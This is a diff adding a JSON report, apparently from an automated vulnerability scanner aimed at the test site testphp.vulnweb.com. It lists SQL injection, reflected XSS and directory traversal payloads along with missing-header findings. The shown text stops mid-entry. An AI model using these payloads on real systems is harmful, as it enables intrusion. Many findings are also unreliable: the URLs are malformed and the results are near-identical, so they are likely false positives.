@@ -1,0 +1,1092 @@
+{
+  "target": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+  "recon_data": {},
+  "vulnerabilities": [
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id='",
+      "parameter": "id",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name=<script>alert(\"XSS\")</script>",
+      "parameter": "name",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=../",
+      "parameter": "path",
+      "payload": "../",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "Missing Security Header",
+      "severity": "Medium",
+      "description": "Missing X-Frame-Options security header",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "The X-Frame-Options header is missing, which could lead to security vulnerabilities"
+    },
+    {
+      "type": "Missing Security Header",
+      "severity": "Medium",
+      "description": "Missing X-Content-Type-Options security header",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "The X-Content-Type-Options header is missing, which could lead to security vulnerabilities"
+    },
+    {
+      "type": "Missing Security Header",
+      "severity": "Medium",
+      "description": "Missing X-XSS-Protection security header",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "The X-XSS-Protection header is missing, which could lead to security vulnerabilities"
+    },
+    {
+      "type": "Missing Security Header",
+      "severity": "Medium",
+      "description": "Missing Strict-Transport-Security security header",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "The Strict-Transport-Security header is missing, which could lead to security vulnerabilities"
+    },
+    {
+      "type": "Missing Security Header",
+      "severity": "Medium",
+      "description": "Missing Content-Security-Policy security header",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "The Content-Security-Policy header is missing, which could lead to security vulnerabilities"
+    },
+    {
+      "type": "Server Information Disclosure",
+      "severity": "Low",
+      "description": "Server version disclosed in HTTP headers",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+      "details": "Server information: nginx/1.19.0"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=..\\",
+      "parameter": "path",
+      "payload": "..\\",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "name",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=\"",
+      "parameter": "id",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=..%2f",
+      "parameter": "path",
+      "payload": "..%2f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name=javascript:alert(\"XSS\")",
+      "parameter": "name",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=' OR '1'='1",
+      "parameter": "id",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=..%252f",
+      "parameter": "path",
+      "payload": "..%252f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name=<svg onload=alert(\"XSS\")>",
+      "parameter": "name",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=..%c0%af",
+      "parameter": "path",
+      "payload": "..%c0%af",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=\" OR \"1\"=\"1",
+      "parameter": "id",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name=\"><script>alert(\"XSS\")</script>",
+      "parameter": "name",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter path",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?path=..%c1%9c",
+      "parameter": "path",
+      "payload": "..%c1%9c",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=' OR 1=1--",
+      "parameter": "id",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter name",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?name='><script>alert(\"XSS\")</script>",
+      "parameter": "name",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=../",
+      "parameter": "dir",
+      "payload": "../",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=\" OR 1=1--",
+      "parameter": "id",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=<script>alert(\"XSS\")</script>",
+      "parameter": "email",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=..\\",
+      "parameter": "dir",
+      "payload": "..\\",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter id",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?id=' UNION SELECT NULL--",
+      "parameter": "id",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "email",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=..%2f",
+      "parameter": "dir",
+      "payload": "..%2f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page='",
+      "parameter": "page",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=javascript:alert(\"XSS\")",
+      "parameter": "email",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=..%252f",
+      "parameter": "dir",
+      "payload": "..%252f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=\"",
+      "parameter": "page",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=<svg onload=alert(\"XSS\")>",
+      "parameter": "email",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=..%c0%af",
+      "parameter": "dir",
+      "payload": "..%c0%af",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=' OR '1'='1",
+      "parameter": "page",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email=\"><script>alert(\"XSS\")</script>",
+      "parameter": "email",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter dir",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?dir=..%c1%9c",
+      "parameter": "dir",
+      "payload": "..%c1%9c",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=\" OR \"1\"=\"1",
+      "parameter": "page",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter email",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?email='><script>alert(\"XSS\")</script>",
+      "parameter": "email",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=../",
+      "parameter": "directory",
+      "payload": "../",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=' OR 1=1--",
+      "parameter": "page",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment=<script>alert(\"XSS\")</script>",
+      "parameter": "comment",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=..\\",
+      "parameter": "directory",
+      "payload": "..\\",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=\" OR 1=1--",
+      "parameter": "page",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "comment",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=..%2f",
+      "parameter": "directory",
+      "payload": "..%2f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter page",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?page=' UNION SELECT NULL--",
+      "parameter": "page",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment=javascript:alert(\"XSS\")",
+      "parameter": "comment",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=..%252f",
+      "parameter": "directory",
+      "payload": "..%252f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search='",
+      "parameter": "search",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment=<svg onload=alert(\"XSS\")>",
+      "parameter": "comment",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=..%c0%af",
+      "parameter": "directory",
+      "payload": "..%c0%af",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=\"",
+      "parameter": "search",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment=\"><script>alert(\"XSS\")</script>",
+      "parameter": "comment",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter directory",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?directory=..%c1%9c",
+      "parameter": "directory",
+      "payload": "..%c1%9c",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SSL Configuration Issue",
+      "severity": "Medium",
+      "description": "SSL/TLS configuration issue detected",
+      "hostname": "testphp.vulnweb.com",
+      "details": "timed out"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=' OR '1'='1",
+      "parameter": "search",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter comment",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?comment='><script>alert(\"XSS\")</script>",
+      "parameter": "comment",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=../",
+      "parameter": "folder",
+      "payload": "../",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=\" OR \"1\"=\"1",
+      "parameter": "search",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=<script>alert(\"XSS\")</script>",
+      "parameter": "search",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=..\\",
+      "parameter": "folder",
+      "payload": "..\\",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=' OR 1=1--",
+      "parameter": "search",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "search",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=..%2f",
+      "parameter": "folder",
+      "payload": "..%2f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=\" OR 1=1--",
+      "parameter": "search",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=javascript:alert(\"XSS\")",
+      "parameter": "search",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=..%252f",
+      "parameter": "folder",
+      "payload": "..%252f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=' UNION SELECT NULL--",
+      "parameter": "search",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=<svg onload=alert(\"XSS\")>",
+      "parameter": "search",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=..%c0%af",
+      "parameter": "folder",
+      "payload": "..%c0%af",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q='",
+      "parameter": "q",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search=\"><script>alert(\"XSS\")</script>",
+      "parameter": "search",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter folder",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?folder=..%c1%9c",
+      "parameter": "folder",
+      "payload": "..%c1%9c",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=\"",
+      "parameter": "q",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter search",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?search='><script>alert(\"XSS\")</script>",
+      "parameter": "search",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=../",
+      "parameter": "file",
+      "payload": "../",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=' OR '1'='1",
+      "parameter": "q",
+      "payload": "' OR '1'='1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=<script>alert(\"XSS\")</script>",
+      "parameter": "q",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=..\\",
+      "parameter": "file",
+      "payload": "..\\",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=\" OR \"1\"=\"1",
+      "parameter": "q",
+      "payload": "\" OR \"1\"=\"1",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=<img src=x onerror=alert(\"XSS\")>",
+      "parameter": "q",
+      "payload": "<img src=x onerror=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=..%2f",
+      "parameter": "file",
+      "payload": "..%2f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=' OR 1=1--",
+      "parameter": "q",
+      "payload": "' OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=javascript:alert(\"XSS\")",
+      "parameter": "q",
+      "payload": "javascript:alert(\"XSS\")",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=..%252f",
+      "parameter": "file",
+      "payload": "..%252f",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=\" OR 1=1--",
+      "parameter": "q",
+      "payload": "\" OR 1=1--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=<svg onload=alert(\"XSS\")>",
+      "parameter": "q",
+      "payload": "<svg onload=alert(\"XSS\")>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=' UNION SELECT NULL--",
+      "parameter": "q",
+      "payload": "' UNION SELECT NULL--",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q=\"><script>alert(\"XSS\")</script>",
+      "parameter": "q",
+      "payload": "\"><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user='",
+      "parameter": "user",
+      "payload": "'",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=..%c0%af",
+      "parameter": "file",
+      "payload": "..%c0%af",
+      "details": "Unusual response received"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "Medium",
+      "description": "Potential XSS in parameter q",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?q='><script>alert(\"XSS\")</script>",
+      "parameter": "q",
+      "payload": "'><script>alert(\"XSS\")</script>",
+      "details": "Payload appears to be reflected in the response"
+    },
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "Potential SQL injection in parameter user",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?user=\"",
+      "parameter": "user",
+      "payload": "\"",
+      "details": "SQL error detected: You have an error in your SQL syntax"
+    },
+    {
+      "type": "Directory Traversal",
+      "severity": "High",
+      "description": "Potential directory traversal in parameter file",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=1/test.php?file=..%c1%9c",
+      "parameter": "file",
+      "payload": "..%c1%9c",
